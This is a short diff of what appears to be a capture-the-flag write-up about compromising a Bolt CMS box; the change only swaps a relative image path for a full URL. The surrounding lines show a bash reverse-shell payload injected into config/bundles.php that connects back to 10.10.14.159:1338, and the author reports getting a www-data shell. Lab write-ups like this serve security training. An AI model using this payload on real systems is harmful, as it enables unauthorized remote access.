@@ -225,7 +225,7 @@ Looking at config/bundles.php, I see a bunch of php code. Let's inject ours and 
 
 In bundles.php, `exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.159/1338 0>&1'");`. 
 
-![bolt-cms bundle](/assets/img/bundle-config.png)
+![bolt-cms bundle](https://th3redtea.github.io/assets/img/bundle-config.png)
 
 I got a session with pwncat as a `www-data` inside another conatiner.
 
